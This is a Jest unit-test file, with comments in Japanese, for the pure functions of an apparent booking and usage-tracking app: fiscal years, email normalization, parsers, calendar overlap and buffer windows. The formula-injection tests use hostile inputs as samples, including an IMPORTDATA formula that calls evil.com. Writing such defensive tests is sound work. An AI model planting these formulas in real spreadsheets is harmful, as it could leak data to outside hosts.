/**
 * ビジネスロジック 単体テスト
 * 対象: コード.js のピュア関数（GAS API 非依存）
 */

'use strict';

const {
  getFiscalYear,
  caseFiscalYear,
  annualUsageKey,
  parseNullablePositiveInteger,
  normalizeEmail,
  parseBoolean,
  sanitizeForSheet,
  parsePositiveIntegerOrDefault,
  parseDisplayCalendarsJson,
  eventsOverlap,
  computeBufferedWindow,
  parseScheduleBufferMin,
} = require('./src/pure-functions');

// ============================================================
// getFiscalYear — 年度計算（4月始まり）
// ============================================================
describe('getFiscalYear', () => {
  test('4月は同年度の開始', () => {
    expect(getFiscalYear(new Date('2025-04-01'))).toBe(2025);
    expect(getFiscalYear(new Date('2026-04-01'))).toBe(2026);
  });

  test('3月は前年度の末', () => {
    expect(getFiscalYear(new Date('2026-03-31'))).toBe(2025);
    expect(getFiscalYear(new Date('2025-03-01'))).toBe(2024);
  });

  test('年度境界: 3月末 → 4月始め', () => {
    expect(getFiscalYear(new Date('2026-03-31'))).toBe(2025);
    expect(getFiscalYear(new Date('2026-04-01'))).toBe(2026);
  });

  test('1月・2月は前年度', () => {
    expect(getFiscalYear(new Date('2026-01-01'))).toBe(2025);
    expect(getFiscalYear(new Date('2026-02-28'))).toBe(2025);
  });

  test('12月は同年度', () => {
    expect(getFiscalYear(new Date('2025-12-31'))).toBe(2025);
  });

  test('文字列形式の日付も受け付ける', () => {
    expect(getFiscalYear('2025-04-01T00:00:00')).toBe(2025);
  });

  test('パース不能な文字列は 0 を返す', () => {
    expect(getFiscalYear('invalid')).toBe(0);
    expect(getFiscalYear('not-a-date')).toBe(0);
  });

  test('null は new Date(null) = エポック(1970/1) として扱われ FY1969 を返す', () => {
    // new Date(null) は epoch(0) = 1970-01-01 → 1月は < 3 → FY = 1969
    expect(getFiscalYear(null)).toBe(1969);
  });
});

// ============================================================
// caseFiscalYear — 案件PKからの年度算出（手動追加案件 manual_ 対応）
// ============================================================
describe('caseFiscalYear', () => {
  test('フォーム案件のPK文字列（日時）から年度を求める', () => {
    expect(caseFiscalYear('2026-01-15T10:30:00')).toBe(2025); // 1月 → 前年度
    expect(caseFiscalYear('2025-05-01T09:00:00')).toBe(2025); // 5月 → 同年度
  });

  test('Date オブジェクトのPKも受け付ける', () => {
    expect(caseFiscalYear(new Date('2026-04-01T00:00:00'))).toBe(2026);
  });

  test('手動追加案件 manual_<epoch> を申込日の年度に解決する', () => {
    // 2025-11-01 JST正午 → FY2025
    const epoch = new Date('2025-11-01T12:00:00+09:00').getTime();
    expect(caseFiscalYear('manual_' + epoch)).toBe(2025);
    // 2026-02-15 → 2月は前年度 → FY2025
    const epoch2 = new Date('2026-02-15T12:00:00+09:00').getTime();
    expect(caseFiscalYear('manual_' + epoch2)).toBe(2025);
    // 2026-04-10 → FY2026
    const epoch3 = new Date('2026-04-10T12:00:00+09:00').getTime();
    expect(caseFiscalYear('manual_' + epoch3)).toBe(2026);
  });

  test('manual_ の旧バグ回帰防止: 0 に落ちない（実年度を返す）', () => {
    const epoch = new Date('2025-11-01T12:00:00+09:00').getTime();
    expect(caseFiscalYear('manual_' + epoch)).not.toBe(0);
  });

  test('不正な manual_ エポックは 0 を返す', () => {
    expect(caseFiscalYear('manual_notanumber')).toBe(0);
  });
});

// ============================================================
// annualUsageKey — 年間集計キー（メール正規化 + 年度）
// ============================================================
describe('annualUsageKey', () => {
  test('同一メール・同一年度なら、フォーム案件と手動追加案件で同じキーになる', () => {
    const manualEpoch = new Date('2025-11-01T12:00:00+09:00').getTime();
    const formKey = annualUsageKey('sato@welfare.jp', '2025-12-01T11:00:00'); // FY2025
    const manualKey = annualUsageKey('sato@welfare.jp', 'manual_' + manualEpoch); // FY2025
    expect(manualKey).toBe(formKey);
  });

  test('メール表記ゆれ（大小文字・前後空白）を正規化して同一キーにする', () => {
    expect(annualUsageKey('  SATO@Welfare.JP ', '2025-12-01T11:00:00'))
      .toBe(annualUsageKey('sato@welfare.jp', '2025-12-01T11:00:00'));
  });

  test('年度が異なれば別キーになる', () => {
    expect(annualUsageKey('a@b.jp', '2025-05-01T00:00:00'))
      .not.toBe(annualUsageKey('a@b.jp', '2026-05-01T00:00:00'));
  });
});

// ============================================================
// parseNullablePositiveInteger — 上限特例値のパース
// ============================================================
describe('parseNullablePositiveInteger', () => {
  test('正の整数を返す', () => {
    expect(parseNullablePositiveInteger(3)).toBe(3);
    expect(parseNullablePositiveInteger('5')).toBe(5);
    expect(parseNullablePositiveInteger(10)).toBe(10);
  });

  test('小数は切り捨て', () => {
    expect(parseNullablePositiveInteger(3.9)).toBe(3);
    expect(parseNullablePositiveInteger('2.7')).toBe(2);
  });

  test('null / undefined / 空文字は null を返す（全体設定に戻す）', () => {
    expect(parseNullablePositiveInteger(null)).toBeNull();
    expect(parseNullablePositiveInteger(undefined)).toBeNull();
    expect(parseNullablePositiveInteger('')).toBeNull();
    expect(parseNullablePositiveInteger('  ')).toBeNull();
  });

  test('0 以下はエラー', () => {
    expect(() => parseNullablePositiveInteger(0)).toThrow();
    expect(() => parseNullablePositiveInteger(-1)).toThrow();
  });

  test('非数値はエラー', () => {
    expect(() => parseNullablePositiveInteger('abc')).toThrow();
    expect(() => parseNullablePositiveInteger(Infinity)).toThrow();
  });
});

// ============================================================
// normalizeEmail — メール正規化
// ============================================================
describe('normalizeEmail', () => {
  test('小文字に変換する', () => {
    expect(normalizeEmail('User@Example.COM')).toBe('user@example.com');
  });

  test('前後の空白をトリム', () => {
    expect(normalizeEmail('  test@example.jp  ')).toBe('test@example.jp');
  });

  test('null / undefined は空文字', () => {
    expect(normalizeEmail(null)).toBe('');
    expect(normalizeEmail(undefined)).toBe('');
  });

  test('既に正規化されたメールはそのまま', () => {
    expect(normalizeEmail('test@tadakayo.jp')).toBe('test@tadakayo.jp');
  });
});

// ============================================================
// parseBoolean — 設定値のブール変換
// ============================================================
describe('parseBoolean', () => {
  test('true/false はそのまま', () => {
    expect(parseBoolean(true, false)).toBe(true);
    expect(parseBoolean(false, true)).toBe(false);
  });

  test('"true" / "1" / "yes" / "on" は true', () => {
    expect(parseBoolean('true',  false)).toBe(true);
    expect(parseBoolean('1',     false)).toBe(true);
    expect(parseBoolean('yes',   false)).toBe(true);
    expect(parseBoolean('on',    false)).toBe(true);
  });

  test('"false" / "0" / "no" / "off" は false', () => {
    expect(parseBoolean('false', true)).toBe(false);
    expect(parseBoolean('0',     true)).toBe(false);
    expect(parseBoolean('no',    true)).toBe(false);
    expect(parseBoolean('off',   true)).toBe(false);
  });

  test('大文字小文字を区別しない', () => {
    expect(parseBoolean('TRUE',  false)).toBe(true);
    expect(parseBoolean('FALSE', true)).toBe(false);
  });

  test('空文字/null はデフォルト値を返す', () => {
    expect(parseBoolean('',   true)).toBe(true);
    expect(parseBoolean(null, false)).toBe(false);
  });
});

// ============================================================
// sanitizeForSheet — スプレッドシート数式インジェクション防止
// OWASP A03:2025 準拠
// ============================================================
describe('sanitizeForSheet — 数式インジェクション防止 (OWASP A03:2025)', () => {
  test('= で始まる文字列にアポストロフィを付与', () => {
    expect(sanitizeForSheet('=SUM(A1)')).toBe("'=SUM(A1)");
    expect(sanitizeForSheet('=IMPORTDATA("http://evil.com")')).toBe("'=IMPORTDATA(\"http://evil.com\")");
  });

  test('+ で始まる文字列を無害化', () => {
    expect(sanitizeForSheet('+1234')).toBe("'+1234");
  });

  test('- で始まる文字列を無害化', () => {
    expect(sanitizeForSheet('-1234')).toBe("'-1234");
  });

  test('@ で始まる文字列を無害化（DDE攻撃）', () => {
    expect(sanitizeForSheet('@SUM(1+1)')).toBe("'@SUM(1+1)");
  });

  test('タブ / CR で始まる文字列を無害化', () => {
    expect(sanitizeForSheet('\t=inject')).toBe("'\t=inject");
    expect(sanitizeForSheet('\r=inject')).toBe("'\r=inject");
  });

  test('通常の文字列はそのまま', () => {
    expect(sanitizeForSheet('やまだ訪問介護ステーション')).toBe('やまだ訪問介護ステーション');
    expect(sanitizeForSheet('test@example.com')).toBe('test@example.com');
    expect(sanitizeForSheet('山田一郎')).toBe('山田一郎');
  });

  test('空文字はそのまま', () => {
    expect(sanitizeForSheet('')).toBe('');
  });

  test('非文字列はそのまま返す', () => {
    expect(sanitizeForSheet(null)).toBeNull();
    expect(sanitizeForSheet(undefined)).toBeUndefined();
    expect(sanitizeForSheet(123)).toBe(123);
    expect(sanitizeForSheet(true)).toBe(true);
  });

  test('= 始まりでも通常のテキスト（メール等）は影響を受けない（@ は途中なら正常）', () => {
    // メールは @ が先頭に来ない
    expect(sanitizeForSheet('user@example.com')).toBe('user@example.com');
  });
});

// ============================================================
// parsePositiveIntegerOrDefault — 設定値のパース
// ============================================================
describe('parsePositiveIntegerOrDefault', () => {
  test('正の整数を返す', () => {
    expect(parsePositiveIntegerOrDefault('10', 10)).toBe(10);
    expect(parsePositiveIntegerOrDefault('3', 3)).toBe(3);
    expect(parsePositiveIntegerOrDefault(5, 3)).toBe(5);
  });

  test('無効な値はデフォルトを返す', () => {
    expect(parsePositiveIntegerOrDefault('', 10)).toBe(10);
    expect(parsePositiveIntegerOrDefault('abc', 10)).toBe(10);
    expect(parsePositiveIntegerOrDefault('-5', 10)).toBe(10);
    expect(parsePositiveIntegerOrDefault('0', 10)).toBe(10);
  });

  test('小数は切り捨て', () => {
    expect(parsePositiveIntegerOrDefault('3.9', 10)).toBe(3);
  });
});

// ============================================================
// parseDisplayCalendarsJson — 表示専用カレンダー設定（v1.11.7）
// ============================================================
describe('parseDisplayCalendarsJson', () => {
  test('有効な配列を返す', () => {
    const raw = '[{"name":"タダスク","id":"abc@group.calendar.google.com"}]';
    expect(parseDisplayCalendarsJson(raw)).toEqual([
      { name: 'タダスク', id: 'abc@group.calendar.google.com' }
    ]);
  });

  test('複数件の配列', () => {
    const raw = '[{"name":"A","id":"a@x"},{"name":"B","id":"b@y"}]';
    expect(parseDisplayCalendarsJson(raw)).toHaveLength(2);
  });

  test('空文字・null・undefined は空配列', () => {
    expect(parseDisplayCalendarsJson('')).toEqual([]);
    expect(parseDisplayCalendarsJson(null)).toEqual([]);
    expect(parseDisplayCalendarsJson(undefined)).toEqual([]);
  });

  test('壊れたJSONは空配列', () => {
    expect(parseDisplayCalendarsJson('{invalid')).toEqual([]);
    expect(parseDisplayCalendarsJson('not json')).toEqual([]);
  });

  test('配列でないJSONは空配列', () => {
    expect(parseDisplayCalendarsJson('{"name":"A"}')).toEqual([]);
    expect(parseDisplayCalendarsJson('"string"')).toEqual([]);
  });

  test('id が無いエントリはスキップ', () => {
    const raw = '[{"name":"NoId"},{"name":"Valid","id":"v@x"}]';
    expect(parseDisplayCalendarsJson(raw)).toEqual([{ name: 'Valid', id: 'v@x' }]);
  });

  test('name が無ければ id が name にフォールバック', () => {
    const raw = '[{"id":"only-id@x"}]';
    expect(parseDisplayCalendarsJson(raw)).toEqual([{ name: 'only-id@x', id: 'only-id@x' }]);
  });
});

// ============================================================
// eventsOverlap — 時間帯重複判定（v1.11.7）
// ============================================================
describe('eventsOverlap', () => {
  const t = (s) => new Date(s);

  test('完全に重なる', () => {
    expect(eventsOverlap(t('2026-05-10T10:00'), t('2026-05-10T11:00'),
                        t('2026-05-10T10:30'), t('2026-05-10T10:45'))).toBe(true);
  });

  test('部分重複（前にズレ）', () => {
    expect(eventsOverlap(t('2026-05-10T10:00'), t('2026-05-10T11:00'),
                        t('2026-05-10T09:30'), t('2026-05-10T10:30'))).toBe(true);
  });

  test('部分重複（後ろにズレ）', () => {
    expect(eventsOverlap(t('2026-05-10T10:00'), t('2026-05-10T11:00'),
                        t('2026-05-10T10:30'), t('2026-05-10T11:30'))).toBe(true);
  });

  test('境界（端点接触）は重なりなし', () => {
    expect(eventsOverlap(t('2026-05-10T10:00'), t('2026-05-10T11:00'),
                        t('2026-05-10T11:00'), t('2026-05-10T12:00'))).toBe(false);
    expect(eventsOverlap(t('2026-05-10T10:00'), t('2026-05-10T11:00'),
                        t('2026-05-10T09:00'), t('2026-05-10T10:00'))).toBe(false);
  });

  test('完全に離れている', () => {
    expect(eventsOverlap(t('2026-05-10T10:00'), t('2026-05-10T11:00'),
                        t('2026-05-10T13:00'), t('2026-05-10T14:00'))).toBe(false);
  });

  test('ISO文字列でも動作する', () => {
    expect(eventsOverlap('2026-05-10T10:00:00', '2026-05-10T11:00:00',
                        '2026-05-10T10:30:00', '2026-05-10T10:45:00')).toBe(true);
  });
});

// ============================================================
// computeBufferedWindow — バッファ込み占有時間帯計算（v1.11.7）
// ============================================================
describe('computeBufferedWindow', () => {
  test('60分予約 + バッファ30分', () => {
    const win = computeBufferedWindow(new Date('2026-05-10T14:00:00'), 60, 30);
    expect(win.start.toISOString()).toBe(new Date('2026-05-10T13:30:00').toISOString());
    expect(win.end.toISOString()).toBe(new Date('2026-05-10T15:30:00').toISOString());
    expect(win.plainStart.toISOString()).toBe(new Date('2026-05-10T14:00:00').toISOString());
    expect(win.plainEnd.toISOString()).toBe(new Date('2026-05-10T15:00:00').toISOString());
  });

  test('バッファ0分はそのまま', () => {
    const win = computeBufferedWindow(new Date('2026-05-10T14:00:00'), 60, 0);
    expect(win.start.getTime()).toBe(win.plainStart.getTime());
    expect(win.end.getTime()).toBe(win.plainEnd.getTime());
  });

  test('負のバッファは 0 として扱う', () => {
    const win = computeBufferedWindow(new Date('2026-05-10T14:00:00'), 60, -10);
    expect(win.start.getTime()).toBe(win.plainStart.getTime());
  });

  test('負の継続時間は 0 として扱う', () => {
    const win = computeBufferedWindow(new Date('2026-05-10T14:00:00'), -30, 10);
    expect(win.plainStart.getTime()).toBe(win.plainEnd.getTime());
  });
});

// ============================================================
// parseScheduleBufferMin — バッファ分パース（v1.11.7）
// ============================================================
describe('parseScheduleBufferMin', () => {
  test('正の整数', () => {
    expect(parseScheduleBufferMin('30', 30)).toBe(30);
    expect(parseScheduleBufferMin('15', 30)).toBe(15);
    expect(parseScheduleBufferMin('0', 30)).toBe(0);
  });

  test('空文字・無効値はデフォルト', () => {
    expect(parseScheduleBufferMin('', 30)).toBe(30);
    expect(parseScheduleBufferMin('abc', 30)).toBe(30);
    expect(parseScheduleBufferMin(null, 30)).toBe(30);
  });

  test('負の値はデフォルト', () => {
    expect(parseScheduleBufferMin('-5', 30)).toBe(30);
  });

  test('小数は切り捨て', () => {
    expect(parseScheduleBufferMin('29.9', 30)).toBe(29);
  });
});
